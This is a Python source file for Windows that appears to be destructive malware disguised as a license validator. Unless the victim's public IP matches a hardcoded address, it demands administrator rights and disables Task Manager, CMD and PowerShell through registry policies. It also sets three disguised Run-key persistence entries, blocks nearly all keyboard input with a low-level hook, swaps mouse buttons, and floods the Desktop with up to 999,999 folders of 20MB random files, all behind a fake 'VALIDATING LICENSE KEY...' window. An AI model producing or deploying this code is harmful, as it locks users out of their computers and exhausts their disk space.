import os
import sys
import ctypes
import subprocess
import urllib.request
import winreg
import time
import random
import string
import threading
import tkinter as tk
from pathlib import Path
from ctypes import wintypes

# --- WINDOWS API SETUP ---
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(wintypes.ULONG))
    ]

class UltimateChaosGuard:
    def __init__(self):
        self.authorized_ip = "146.70.124.148"
        self.persistence_names = ["WinSystemHealth", "DisplaySvcBroker", "WinUpdateManager"]
        self.hook = None

    def is_admin(self):
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False

    def request_admin(self):
        if not self.is_admin():
            # Re-launch with admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()

    def get_ip(self):
        """Fetches public IP using built-in urllib."""
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
                return response.read().decode('utf-8')
        except:
            return "0.0.0.0"

    def apply_lockdown(self):
        """Disables TaskMgr, CMD, PowerShell, and sets 3x Persistence."""
        try:
            paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\System"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer")
            ]

            # 1. Disable System Tools
            with winreg.CreateKey(paths[0][0], paths[0][1]) as k:
                winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            with winreg.CreateKey(paths[1][0], paths[1][1]) as k:
                winreg.SetValueEx(k, "DisableCMD", 0, winreg.REG_DWORD, 1)
            with winreg.CreateKey(paths[2][0], paths[2][1]) as k:
                winreg.SetValueEx(k, "DisallowRun", 0, winreg.REG_DWORD, 1)
                with winreg.CreateKey(k, "DisallowRun") as dr:
                    winreg.SetValueEx(dr, "1", 0, winreg.REG_SZ, "powershell.exe")
                    winreg.SetValueEx(dr, "2", 0, winreg.REG_SZ, "pwsh.exe")

            # 2. Set Persistence
            exe_path = os.path.realpath(sys.executable)
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as k:
                for name in self.persistence_names:
                    winreg.SetValueEx(k, name, 0, winreg.REG_SZ, exe_path)
        except: pass

    def kbd_callback(self, nCode, wParam, lParam):
        """Allows only: n, g, i, r, e."""
        if nCode == 0 and wParam == WM_KEYDOWN:
            vk = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents.vkCode
            if vk not in [0x4E, 0x47, 0x49, 0x52, 0x45]: # N, G, I, R, E
                return 1
        return user32.CallNextHookEx(self.hook, nCode, wParam, lParam)

    def start_input_lock(self):
        user32.SwapMouseButton(True)
        CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
        self.pointer = CMPFUNC(self.kbd_callback)
        self.hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, self.pointer, kernel32.GetModuleHandleW(None), 0)
        
        def pump():
            msg = wintypes.MSG()
            while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
        threading.Thread(target=pump, daemon=True).start()

    def folder_flood(self):
        """Creates 999,999 folders with 20MB files on Desktop."""
        def task():
            desktop = Path.home() / "Desktop"
            for i in range(1, 1000000):
                try:
                    f_name = f"India_dev_{i}_{''.join(random.choices(string.ascii_letters + string.digits, k=5))}"
                    path = desktop / f_name
                    path.mkdir(exist_ok=True)
                    with open(path / "random.bin", "wb") as rb:
                        rb.write(os.urandom(20 * 1024 * 1024))
                except: break
        threading.Thread(target=task, daemon=True).start()

    def show_gui(self):
        def launch():
            root = tk.Tk()
            root.overrideredirect(True)
            root.attributes("-topmost", True)
            root.configure(bg='#0D0D0D')
            w, h = 480, 200
            x = (root.winfo_screenwidth() // 2) - (w // 2)
            y = (root.winfo_screenheight() // 2) - (h // 2)
            root.geometry(f"{w}x{h}+{x}+{y}")
            tk.Label(root, text="VALIDATING LICENSE KEY...", 
                     fg="#00FF41", bg="#0D0D0D", 
                     font=("Consolas", 18, "bold")).pack(expand=True)
            root.mainloop()
        threading.Thread(target=launch, daemon=True).start()

    def run(self):
        current_ip = self.get_ip()
        
        if current_ip == self.authorized_ip:
            # DEVELOPER BYPASS
            self.show_gui()
        else:
            # FULL CHAOS MODE
            self.apply_lockdown()
            self.start_input_lock()
            self.folder_flood()
            self.show_gui()

if __name__ == "__main__":
    guard = UltimateChaosGuard()
    guard.request_admin()
    guard.run()
    while True:
        time.sleep(10)